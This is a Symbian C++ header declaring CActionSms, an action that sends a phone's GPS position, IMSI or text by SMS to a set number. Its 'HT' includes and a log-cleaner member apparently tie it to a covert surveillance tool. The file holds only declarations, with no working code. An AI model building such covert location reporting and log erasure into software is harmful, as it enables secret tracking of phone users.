/*
 ============================================================================
 Name		: ActionSms.h
 Author	  : Marco Bellino
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CActionSms declaration
 ============================================================================
 */

#ifndef ACTIONSMS_H
#define ACTIONSMS_H

// INCLUDES
#include <e32std.h>
#include <e32base.h>

#include <HT\Phone.h>
#include <HT\GPSPosition.h>
#include <HT\LogCleaner.h>       // added jo'
#include "SendSmsSocket.h"

#include "AbstractAction.h"

// CLASS DECLARATION

enum TSmsOptionType
	{
	ESms_GPS = 1,
	ESms_IMSI,
	ESms_Text
	};

/**
 *  CActionSms
 * 
 */
class CActionSms : public CAbstractAction, public MPositionerObserver, public MSmsSendHandler
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	~CActionSms();

	/**
	 * Two-phased constructor.
	 */
	static CActionSms* NewL(const TDesC8& params);

	/**
	 * Two-phased constructor.
	 */
	static CActionSms* NewLC(const TDesC8& params);

protected:
	// from CAbstractAction
	virtual void DispatchStartCommandL();

private:
	// from MSmsSendHandler
	virtual void SmsSentL(TInt aError);
	
	// from MPositionerObserver
	//virtual void HandleGPSPositionL(TPosition position);   // original MB
	virtual void HandleGPSPositionL(TPositionSatelliteInfo position);
	virtual void HandleGPSErrorL(TInt error);
	
	
	/**
	 * Constructor for performing 1st stage construction
	 */
	CActionSms();

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL(const TDesC8& params);

private:
	TSmsOptionType iOption;
	RSocketServ iSocketServ;
	CGPSPosition* iGPS;
	CPhone* iPhone;
	CSmsSenderSocket* iSendSms;
	TBuf<140> iSmsText;
	CTelephony::TTelNumber iSmsNumber;
	
	CLogCleaner* iLogCleaner;   // added jo'
	RFs iFs;					// added jo'
	};

#endif // ACTIONSMS_H
